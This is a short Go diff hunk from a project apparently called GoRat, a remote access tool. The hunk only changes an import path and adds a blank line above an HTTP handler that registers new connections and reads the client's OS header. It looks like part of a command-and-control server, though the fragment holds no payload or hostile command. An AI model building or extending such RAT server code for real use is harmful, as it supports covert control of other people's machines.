@@ -7,10 +7,11 @@ import (
 	"net/http"
 	"time"
 
-	"github.com/NotKatsu/GoRat/database"
+	"github.com/NotKatsu/GoRat/modules/database"
 
 	"github.com/pterm/pterm"
 )
+
 func ConnectionNew(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "POST" {
 		OS := r.Header.Get("OS")
